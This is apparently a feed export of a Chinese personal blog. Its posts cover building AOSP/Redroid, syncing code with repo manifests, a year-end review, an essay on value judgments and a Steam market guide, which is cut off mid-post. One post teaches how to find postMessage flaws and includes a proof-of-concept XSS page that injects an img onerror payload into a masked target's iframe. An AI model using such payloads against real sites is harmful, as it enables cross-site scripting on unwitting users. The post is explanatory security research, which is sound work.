<li><code>m</code>  编译整个项目</li>
<li><code>mm</code> 编译当前目录项目</li>
<li><code>croot</code> 回到项目根目录</li>
<li><code>lunch</code> 选择编译目标</li>
</ul>
<p>大部分只是简单的命令套壳无需关心, 剩下的也只是调用 <code>build/soong/soong_ui.bash</code> 这个脚本</p>
<p>这个脚本有 <code>&quot;--make-mode&quot; &quot;--dumpvar-mode&quot; &quot;--dumpvars-mode&quot; &quot;--build-mode&quot;   </code>  四个选项</p>
<p><code>--dumpvar-mode </code>用于从整个项目里获取编译变量设置,   <code>get_build_var</code> 就简单封装了这个功能</p>
<p><code>lunch</code> 获取可用编译目标 就是调用 <code>get_build_var COMMON_LUNCH_CHOICES</code> (这个可以在命令行里直接执行)</p>
<p>可以看到输出里面出现了<code>redroid</code>开头的四个选项,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">redroid_arm64-userdebug 
</span></span><span class="line"><span class="cl">redroid_arm64_only-userdebug 
</span></span><span class="line"><span class="cl">redroid_x86_64-userdebug 
</span></span><span class="line"><span class="cl">redroid_x86_64_only-userdebug
</span></span></code></pre></td></tr></table>
</div>
</div><p>这是<code>redroid</code>添加的 位于<code>device/redroid/AndroidProducts.mk</code>,</p>
<p>然后执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">repo forall -c &#39;git lfs pull&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>同步<code>git lfs</code>文件,  原版是不需要的.  但是<code>redroid</code> 在<code>external/chromium-webview/prebuilt/</code> 添加了<code>lfs</code>项目, 如果速度很慢,可以考虑直接下载而不是走`lfs</p>
<p>接着执行</p>
<p><code>m</code>   # -j x</p>
<p>等待很长一段时间后,就能在 <code>out/target/ </code>看到产物</p>
<p>编译完成打包成<code>docker</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> out/target/product/redroid_x86_64_only/
</span></span><span class="line"><span class="cl">sudo mount system.img system -o ro
</span></span><span class="line"><span class="cl">sudo mount vendor.img vendor -o ro
</span></span><span class="line"><span class="cl">sudo tar --xattrs -c vendor -C system --exclude<span class="o">=</span><span class="s2">&#34;./vendor&#34;</span> . <span class="p">|</span> docker import -c <span class="s1">&#39;ENTRYPOINT [&#34;/init&#34;, &#34;androidboot.hardware=redroid&#34;]&#39;</span> - redroid
</span></span><span class="line"><span class="cl">sudo umount system vendor
</span></span></code></pre></td></tr></table>
</div>
</div><p>配置环境 参考<a href="https://github.com/remote-android/redroid-doc/blob/master/deploy/ubuntu.md">文档</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -itd  --privileged -v ~/data11:/data --name redroid --rm redroid
</span></span></code></pre></td></tr></table>
</div>
</div><p>出现闪退错误使用命令排查</p>
<p><code>sudo dmesg  -T</code></p>
]]></content></item><item><title>从零开始自定义安卓系统(1) 下载代码</title><link>https://blue-bird1.github.io/posts/aosp-1/</link><pubDate>Thu, 18 Jan 2024 17:19:55 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-1/</guid><description>从零开始自定义安卓系统(1) 下载代码 前言 aosp 魔改教程已经有很多了, 但是都比较零碎或者太过古老. 出于记录的想法,写下这些. 本篇教程基于ubunt</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统1-下载代码">从零开始自定义安卓系统(1) 下载代码</h2>
<h3 id="前言">前言</h3>
<p>aosp 魔改教程已经有很多了, 但是都比较零碎或者太过古老. 出于记录的想法,写下这些.</p>
<p>本篇教程基于<code>ubuntu22</code> 和 <code>Android 13 </code> 和<code>Redroid</code>.</p>
<h3 id="下载代码">下载代码</h3>
<p>所有教程里都必须拥有的阶段 (导致作者实际上看过很多次)</p>
<p>简单说明步骤 (可以先不执行)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 下载repo  </span>
</span></span><span class="line"><span class="cl">sudo apt-get install repo
</span></span><span class="line"><span class="cl"><span class="c1"># 在项目目录 执行初始化</span>
</span></span><span class="line"><span class="cl">repo init -u https://android.googlesource.com/platform/manifest --git-lfs --depth<span class="o">=</span><span class="m">1</span> -b android-13.0.0_r82
</span></span><span class="line"><span class="cl"><span class="c1"># 同步</span>
</span></span><span class="line"><span class="cl">repo sync -j8
</span></span></code></pre></td></tr></table>
</div>
</div><p>repo实际上做的事情是</p>
<ol>
<li>从 <a href="https://android.googlesource.com/platform/manifest">https://android.googlesource.com/platform/manifest</a> 这个git仓库的<code>android-13.0.0_r82</code>分支获取 <code>default.xml</code> 这个文件.  具体可用分支列表可以看链接</li>
<li>进行一些操作后写入到当前目录的 <code>.repo</code>目录</li>
<li>按xml文件执行git clone和同步, xml文件里描述了目录与git仓库的对应关系.</li>
</ol>
<p>而如果需要添加自己代码仓库 就可以往<code>.repo</code>里写自己的xml文件  <a href="https://gerrit.googlesource.com/git-repo/+/HEAD/docs/manifest-format.md">文件格式参考</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir .repo/local_manifests
</span></span><span class="line"><span class="cl">touch .repo/local_manifests/bluebird.xml
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后编辑</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;manifest&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;remote</span> <span class="na">name=</span><span class="s">&#34;bluebird&#34;</span> <span class="na">fetch=</span><span class="s">&#34;https://github.com/blue-bird1/&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Our own components --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;project</span> <span class="na">path=</span><span class="s">&#34;device/bluebird&#34;</span> <span class="na">name=</span><span class="s">&#34;device&#34;</span>  <span class="na">remote=</span><span class="s">&#34;bluebird&#34;</span> <span class="na">revision=</span><span class="s">&#34;main&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/manifest&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;remote</span> <span class="na">name=</span><span class="s">&#34;bluebird&#34;</span> <span class="na">fetch=</span><span class="s">&#34;https://github.com/blue-bird1/&#34;</span>  <span class="nt">/&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>的fetch为自己的git用户地址 name可以任意修改</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;project</span> <span class="na">path=</span><span class="s">&#34;device/bluebird&#34;</span> <span class="na">name=</span><span class="s">&#34;device&#34;</span>  <span class="na">remote=</span><span class="s">&#34;bluebird&#34;</span> <span class="nt">/&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>path</code>为相对于项目的相对路径  <code>remote</code>需要与上面的 <code>name</code>对应 name则是仓库名, 实际上对应的url 为 <code>https://github.com/blue-bird1/device</code></p>
<p>执行<code>repo sync</code>后 可以发现 <code>device/bluebird</code> 出现了自己的项目代码.</p>
<p>而<code>redroid</code>项目也用了同样的方法实现自定义 <code>AOSP</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 来自https://github.com/remote-android/redroid-doc/tree/master/android-builder-docker 文档的操作
</span></span><span class="line"><span class="cl">git clone https://github.com/remote-android/local_manifests.git .repo/local_manifests -b 13.0.0 
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以查看目录下的两个<code>manifest</code>文件了解做了什么操作 ,主要是添加五个自己的项目到代码里.</p>
<p>如果想要直接对<code>redroid</code> 进行fork修改可以直接对此文件进行修改</p>
]]></content></item><item><title>挖掘iframe通信安全漏洞</title><link>https://blue-bird1.github.io/posts/iframesec/</link><pubDate>Sun, 12 Jun 2022 14:45:47 +0800</pubDate><guid>https://blue-bird1.github.io/posts/iframesec/</guid><description>挖掘iframe通信安全漏洞 原理 跨域通信一般是直接ajax,用限定请求域名的方法来保证安全.但是也具有其中的局限性,只能读取服务器数据.而不</description><content type="html"><![CDATA[<h2 id="挖掘iframe通信安全漏洞">挖掘iframe通信安全漏洞</h2>
<h3 id="原理">原理</h3>
<p>跨域通信一般是直接ajax,用限定请求域名的方法来保证安全.但是也具有其中的局限性,只能读取服务器数据.而不能读取本地的localStorage数据等.</p>
<p>如果需要本地数据,依然需要iframe,现在iframe通信采用的是<code>postmessage</code>的形式</p>
<p>一个简单的例子就是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> window.addEventListener(&#34;message&#34;, (function(e) {
</span></span><span class="line"><span class="cl">                console.log(&#34;[evt]&#34;, e.data),
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> window.parent.postMessage({
</span></span><span class="line"><span class="cl">                            scrollHeight: t,
</span></span><span class="line"><span class="cl">                            pageHight: t,
</span></span><span class="line"><span class="cl">                            orange: e.warnSensitive,
</span></span><span class="line"><span class="cl">                            red: e.dangerSensitive
</span></span><span class="line"><span class="cl"> }, &#34;*&#34;)
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>以上实际上是很不安全的例子,因为<code>postmessage</code>没有浏览器的跨域保护, 接收的数据可能来源于任何一个域名.</p>
<p>正确的写法应该是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> window.addEventListener(&#34;message&#34;, (function(e) {
</span></span><span class="line"><span class="cl">   if (e.origin !== &#34;http://example.com&#34;)
</span></span><span class="line"><span class="cl">    return;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">   console.log(&#34;[evt]&#34;, e.data),
</span></span><span class="line"><span class="cl">                e.data.cvid &amp;&amp; (e.data.text || e.data.newHtml) &amp;&amp;      t.setContent(e.data)
</span></span><span class="line"><span class="cl"> }
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="实战">实战</h3>
<p><img src="/images/image-20220612144739249.png" alt="image-20220612144739249"></p>
<p>在浏览器f12就能直接看到iframe的载入. 当然iframe也可能是单纯用于展示,没有<code>postmessage</code>的通信.</p>
<p>不过可以在浏览器点击<code>global listeners</code> 然后看有没有<code>message</code>的事件监听者</p>
<p><img src="/images/image-20220612150032455.png" alt="image-20220612150032455"></p>
<p>可以看到其中有两个,其中有一个是框架生成的,另一个才是程序员自己写的.框架那个做了验证,</p>
<p>蓝色的链接也能直接点到达代码位置</p>
<p>代码大致如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> window.addEventListener(&#34;message&#34;, (function(e) {
</span></span><span class="line"><span class="cl">                var t = this;
</span></span><span class="line"><span class="cl">                console.log(&#34;[evt]&#34;, e.data),
</span></span><span class="line"><span class="cl">                e.data.cvid &amp;&amp; (e.data.text || e.data.newHtml) &amp;&amp; t.setContent(e.data)
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  setContent: function(t) {
</span></span><span class="line"><span class="cl">                if (t.newHtml) {
</span></span><span class="line"><span class="cl">                    var n = function() {
</span></span><span class="line"><span class="cl">                        var t = arguments.length &amp;gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : &#34;&#34;
</span></span><span class="line"><span class="cl">                          , e = arguments.length &amp;gt; 1 &amp;&amp; void 0 !== arguments[1] ? arguments[1] : []
</span></span><span class="line"><span class="cl">                          , n = arguments.length &amp;gt; 2 &amp;&amp; void 0 !== arguments[2] ? arguments[2] : []
</span></span><span class="line"><span class="cl">                          , i = h(t, e)
</span></span><span class="line"><span class="cl">                          , o = h(i.content, n)
</span></span><span class="line"><span class="cl">                          , a = document.createElement(&#34;div&#34;)
</span></span><span class="line"><span class="cl">                        a.innerHTML = o.content,
</span></span><span class="line"><span class="cl">// 省略
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接传入了<code>innerhtml</code> ,从代码的取值可以构造出以下exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;iframe width=&#34;800&#34; height=&#34;800&#34; id=&#34;bilibili&#34; style=&#34;display:none&#34;&gt;&lt;/iframe&gt;
</span></span><span class="line"><span class="cl">&lt;script&gt;
</span></span><span class="line"><span class="cl">const iframe = document.getElementById(&#34;bilibili&#34;)
</span></span><span class="line"><span class="cl">iframe.setAttribute(&#34;src&#34;, &#34;https://www.***.com/h5/note-app/review&#34;);
</span></span><span class="line"><span class="cl">iframe.addEventListener(&#34;load&#34;, () =&gt; {
</span></span><span class="line"><span class="cl">iframe.contentWindow.postMessage(
</span></span><span class="line"><span class="cl">                    {
</span></span><span class="line"><span class="cl">                        newHtml:&#34;&lt;img onerror=&#39;console.log(1)&#39; src=&#39;x&#39; &gt;&#34;,
</span></span><span class="line"><span class="cl">                        cvid:1,
</span></span><span class="line"><span class="cl">                    },&#34;*&#34;
</span></span><span class="line"><span class="cl">);
</span></span><span class="line"><span class="cl">})
</span></span><span class="line"><span class="cl">&lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="总结">总结</h3>
<p>原理和挖掘是不难的, 主要依赖于程序员忘记对iframe验证的错觉. 危害评估最高也就csrf和xss的级别,依赖于被攻击者进入你的网站.</p>
]]></content></item><item><title>2021年度总结</title><link>https://blue-bird1.github.io/posts/2021end/</link><pubDate>Fri, 31 Dec 2021 13:29:59 +0800</pubDate><guid>https://blue-bird1.github.io/posts/2021end/</guid><description>2021年度总结 如果用一个成语形容自己的2021年 就是混吃等死 去年目标回顾 首先看看去年的目标吧 挖几个CVE 博客每月更新一篇 学一些大学基础学科</description><content type="html"><![CDATA[<h3 id="2021年度总结">2021年度总结</h3>
<p>如果用一个成语形容自己的2021年  就是混吃等死</p>
<h3 id="去年目标回顾">去年目标回顾</h3>
<p>首先看看去年的目标吧</p>
<ul>
<li>挖几个CVE</li>
<li>博客每月更新一篇</li>
<li>学一些大学基础学科</li>
<li>控制一下作息 不要老是快天亮才睡了</li>
</ul>
<p>首先 CVE为0 甚至今年都没挖过洞</p>
<p>第二 很显然 摸了 全是水文</p>
<p>学习的话 只能说知道有什么名词了 从什么都听不懂到能知道你们在说很厉害的事情</p>
<p>作息 依然在熬夜..</p>
<p>由此可见 今年非常失败</p>
<h3 id="各平台记录">各平台记录</h3>
<p>惯例了</p>
<p><img src="https://s2.loli.net/2021/12/31/WImJsAkfig8cMEj.jpg" alt="6763dcc176c296d74533cdfb2a6e4252.jpeg"></p>
<p>刷b站比去年少了</p>
<p><img src="https://s2.loli.net/2021/12/31/TiRoDJzsj7GkIFV.jpg" alt="Screenshot_2021-12-31-02-54-57-504_com.netease.cloudmusic.jpg"></p>
<p><img src="https://s2.loli.net/2021/12/31/dkPV8YiNTCBhrG9.jpg" alt="Screenshot_2021-12-31-02-55-03-660_com.netease.cloudmusic.jpg"></p>
<p>网易云一看就是老二次元了</p>
<p>当然今天做的最多的事情是打游戏， 大半年都在打游戏  ，打的身体都都不太好了，手酸腿麻脖子疼</p>
<p><img src="https://s2.loli.net/2021/12/31/r1aIKWvNGb6sZ5e.png" alt="image_2021-12-31_03-01-11.png"></p>
<p>光是以撒就600小时了 和还有其他加起来 今年至少打了一千多个小时.游戏数升到500了，退烧了</p>
<p>从娱乐花了这么多时间，可以看出我今年其他方面的失败</p>
<p><img src="https://s2.loli.net/2021/12/31/IVp6XmzMbfPvHhl.png" alt="image_2021-12-31_03-06-28.png"></p>
<p>一片白花花 比去年还少  我已经是一条咸🐟了.. 挖洞也为0，咸鱼中的咸鱼</p>
<p>现实更是外门没出过，什么都没干，光在打游戏，水群，看视频了</p>
<h3 id="今年学到了什么">今年学到了什么</h3>
<p>读书的话 今年只读了50本左右，但是没用网站记了.（说服自己 读书不是为了完成目标）</p>
<p>不过今年在中图网花了两三百就买到了三十本书，现在还有好几本没看完</p>
<p>其中计算机类的为0，工作水平提升为0.都是一堆杂七杂八的书</p>
<p>总而言之就是了 一大堆没什么用和工作不相关的书</p>
<p>电子书看的除了杂七杂八的书外，为了完成去年目标，也看了一些大学教材. 虽然没学会，但是至少不会连听都听不懂了，从一个文盲变成一个懂一些名词的文盲</p>
<h3 id="明年目标">明年目标</h3>
<p>再来一个例行立flag</p>
<p>首先多锻炼一下，现在已经能明显感觉到身体不好了，再这样下去差不多该去买颈椎/脊椎病康复治疗指南了</p>
<p>第二就是 再学习一些基础知识和，不要成为新时代文盲了</p>
<p>还有就是减少打游戏 看沙雕的时间了</p>
]]></content></item><item><title>价值观</title><link>https://blue-bird1.github.io/posts/value/</link><pubDate>Fri, 10 Dec 2021 17:20:53 +0800</pubDate><guid>https://blue-bird1.github.io/posts/value/</guid><description>价值判断 价值观 本文忽略掉了人文因素 讨论一样东西的价值的时候，技术社区和大众，甚至技术社区之间都有很大的矛盾。 因为人的价值观是非常不同的，简单</description><content type="html"><![CDATA[<h3 id="价值判断">价值判断</h3>
<h4 id="价值观">价值观</h4>
<blockquote>
<p>本文忽略掉了人文因素</p>
</blockquote>
<p>讨论一样东西的价值的时候，技术社区和大众，甚至技术社区之间都有很大的矛盾。
因为人的价值观是非常不同的，简单可以看成的是唯实用论，唯工作论， 唯技术论，唯难度论四个纬度的连续组合。
而评价价值时既受到个人三观影响，也收到对评价事物领域了解程度的影响。如果在某个领域完全没有了解的大众只能使用实用来评价，不可能了解难度如何</p>
<h4 id="实用论与技术论">实用论与技术论</h4>
<p>唯实用论认为一个东西如果没有在现实用上就是没有价值的。也就是一段代码如果没有人使用，就是垃圾。
在公司工作，写出来的代码可能永远不会上线。开源的项目可能从来没有有人用，在实用的眼光来看如果是这样，我们只是在制造垃圾。</p>
<p>而唯技术论则认为即使不实用，但是如果如果有技术含量它就有价值。所以认为代码上造轮子和开源并不是在浪费时间。
这一点常受到唯实用者的嘲讽，认为华而不实，即使用了再多技术不实用也没意义。</p>
<h4 id="实用与技术之争论">实用与技术之争论</h4>
<p>光是这两点对人的工作成果评价的矛盾就很大。一个人用了最简单粗暴的方法实现了一样实用的东西，会收到实用的高评价，技术的低评价。反之亦然.</p>
<h5 id="在计算机">在计算机</h5>
<p>在计算机行业，php就是以前唯实用论最好的语言，对php的无数争论其实就是实用与技术的争论.
在计算机安全则是唯实用论为主，就算你是拿密码123456或者扫描器入侵的，能黑下来就行。但是对人还是会有技术上的评价</p>
<h5 id="在科研">在科研</h5>
<p>在科研学术最好的例子就是材料了，不管你研究出来的材料到底有没有实用价值，只要是新研究都能发论文。</p>
<h4 id="工作量论与难度论">工作量论与难度论</h4>
<p>唯工作量论就比较显然，例如计件薪水毫无疑问是唯工作论。而唯难度论则是它的反面.对唯难度论来说一个工作就算重复了无数遍，对它的价值也不会上升。
这两点体现就是公司会按你完成的工作量评分，但很少考虑实际完成的难度。而程序员则是喷别人或者自贬自己是crud程序员和切图仔。发论文会认为自己在水论文，认为自己所作的工作没有难度没体现价值</p>
<h4 id="我们应该如何评价">我们应该如何评价？</h4>
<p>在谈完所有评价维度后，回归现实来说，社会和自己的评价价值观是不一样，我们要怎么评价自己和别人呢，并做出发展呢.</p>
<h5 id="事物">事物</h5>
<p>现实是唯实用的，我们对事物的评价也应该以实用和工作量为主.公司也是如此把我们当做事物评价的，这个东西实用么，这个东西今天干了多少活。其他的并不关心。所以做一件让人用的东西应该面向实用，背后的技术没有人会关心的，什么简单粗暴用什么就好</p>
<h5 id="自己">自己</h5>
<p>然后评价自己应该唯难度和实用为主，当然反过来也行。
因为难度就是我们一直在说防止失业的护城河，难度越高能代替你的人越少。而实用则是提高需要你这样的人的数量同时提高你能创造的价值，需求高供给少自然工资高失业风险低
但是如果你不想打工了，难度和技术就没有任何意义了，需要唯实用论</p>
<h4 id="不同的评价观念给我们的影响">不同的评价观念给我们的影响</h4>
<p>我们做事情时会不自主的被价值观念影响，偏离了正确的轨迹.</p>
<p>写一个脚本很显然是面向实用的，而喜欢技术的人会不自主的浪费时间在优化代码上，即使知道用完这次一辈子都不会再用了.</p>
<p>受实用影响的话，则容易轻视技术和难度，满足于一辈子crud，然后被现实淘汰.</p>
<p>我们不同的价值观念只是我们的关注点不同，而如果不能自由的切换关注点，我们将被它束缚</p>
]]></content></item><item><title>Steam市场与喜+1经验</title><link>https://blue-bird1.github.io/posts/steam/</link><pubDate>Fri, 05 Feb 2021 03:10:01 +0800</pubDate><guid>https://blue-bird1.github.io/posts/steam/</guid><description>steam 最近在玩steam游戏,也关注了steam相关的论坛 学到了不少关于steam的东西,简单介绍一下 市场货币与价值 严格的来说 steam只支持两</description><content type="html"><![CDATA[<h2 id="steam">steam</h2>
<p>最近在玩steam游戏,也关注了steam相关的论坛 学到了不少关于steam的东西,简单介绍一下</p>
<h3 id="市场货币与价值">市场货币与价值</h3>
<p>严格的来说 steam只支持两种货币 现实货币和steam余额. 但在一定时间段内 <code>一袋宝石</code>和<code>csgo钥匙</code>等也可以充当稳定的标准货币</p>
<p>而<code>一袋宝石</code>和<code>csgo钥匙</code>等波动相当大 在前两个月价格为2.9r[人民币] 现在仅有2.5</p>
<p>因为这些都是游戏虚拟物品 并不是金融等价物  实际价格直接取决于玩家</p>
<p>宝石主要受到steam宝石发行策略的影响 如</p>
<p>在冬季促销时每位用户每天都可以免费获得一张卡牌 分解可获得100宝石(1袋==1000)  大大增加了市场上的宝石供给</p>
<h3 id="交易成本与货币汇率">交易成本与货币汇率</h3>
<p>现实货币由于以下这点  在熟悉市场的人里是没人会直接使用的 所以忽略汇率 直接从余额开始</p>
<h4 id="余额">余额</h4>
<p>官方渠道的余额兑换是1:1.直接充值余额绝对是亏的,保留在银行卡还会获得利息.</p>
<p>但实际上通过steam线下交易(指非steam市场交易)可以获得一定的折扣. 具体在<a href="#offline">线下交易</a>这一节讨论</p>
<p>通过线下交易等渠道 实际上余额实际价值为现实货币的7-8折 甚至更低.这个比率是相当稳定的.</p>
<p>而且steam所有物品都几乎可以通过余额购买,且有部分游戏充值也可以使用steam余额,这也意味着全部八折.</p>
<p>如果要对现实货币反向兑换,steam是不支持的 只有通过线下交易 见<a href="#offline">线下交易</a>这一节的讨论</p>
<p>而想用余额兑换宝石或者csgo钥匙 只能遵循当前市场价在steam购买.</p>
<h4 id="宝石csgo钥匙等库存物品">宝石/csgo钥匙等库存物品</h4>
<p>库存物品有两种方法进行交易</p>
<ul>
<li>通过市场售卖</li>
</ul>
<p>每个市场物品 贩卖时只能获得售价的85%  剩下的15%将作为税收被steam和游戏物品对应开发商(每个物品都有对应的游戏id csgo/dota等属于v社直辖游戏)收走</p>
<p>要回避这种交易成本 只能通过线下交易 (一般是市场价的八折)</p>
<p>除此之外再次转手 还有时间成本 每个物品从市场购买后 7天内不能再销售 下面这种交易不受影响</p>
<ul>
<li>私下以物易物交易</li>
</ul>
<p>每个steam用户可以和其他用户进行交易 只能交换物品(允许一方为空作为赠送) 不能如市场一样交易余额. 交易成本很显然 你需要花时间找到想要购买你的东西的人 并且steam不会为你被诈骗后退回物品</p>
<h3 id="市场商品">市场商品</h3>
<p>steam可获得的有以下几类</p>
<ul>
<li>
<p>游戏/dlc    在商品页面购买 直接入库 不允许交易</p>
</li>
<li>
<p>游戏礼物   在购买多人包时可获得 可以把礼物发送给其他用户 让他们获得游戏. 或是以前礼品机制没改的时候 留存下来的礼品 这类一般是收藏品  一个礼品在收藏圈价值成百上千的很正常</p>
</li>
<li>
<p>游戏激活key  游戏开发商可以在后台生成key 在steam输入这些游戏key可以获得那个游戏</p>
</li>
<li>
<p>勋章 可在个人资料看到 主要作用是每获得/升级一次勋章会获得100经验</p>
</li>
<li>
<p>游戏卡牌  游玩一个具有游戏卡牌的游戏 会掉落游戏卡牌)最大数量为一套卡/2 向上取整) 收集一整套卡牌后合成 可以随机获得勋章+一个聊天表情+一个个人资料背景+一个优惠卷</p>
</li>
<li>
<p>游戏卡牌补充包  除了游玩掉落和在市场购买外 还可以通过打开补充包来获得卡牌. 获得途径有</p>
<p>每有一个人合成一套卡牌 就在已经掉落所有卡牌里的用户 随机挑选一个人赠送补充包 (根据等级有不同的掉落权重 等级越高权重越高).或者通过宝石合成. 这也导致他们之间的价格相互锚定 见下一节内容</p>
</li>
<li>
<p>聊天表情  聊天表情可以在好友聊天界面里使用 (真的有人把steam当成社交软件嘛? )</p>
</li>
<li>
<p>个人资料背景 个人资料背景的价格上限取决于好不好看 例如某流星雨背景当前市场价60+</p>
</li>
<li>
<p>宝石     通过分解 游戏卡牌/聊天表情/个人资料背景可以获得宝石 而对应分解宝石的值受到很多因素影响</p>
</li>
<li>
<p>其他库存物品 每个游戏都可以生成自己的库存物品 例如csgo饰品 橙汁100%的宠物,如果游戏开发者决定让这些物品可交易的话 也可以交易</p>
</li>
<li>
<p>steam点数 在steam消费获得. 可用于steam点数商品 可以购买 头像/头像框/聊天表情/个人资料背景 但均不可交易 可以通过社区奖励来交易 但是需要收到66%的高额税收</p>
</li>
</ul>
<h3 id="商品间的相互关系">商品间的相互关系</h3>
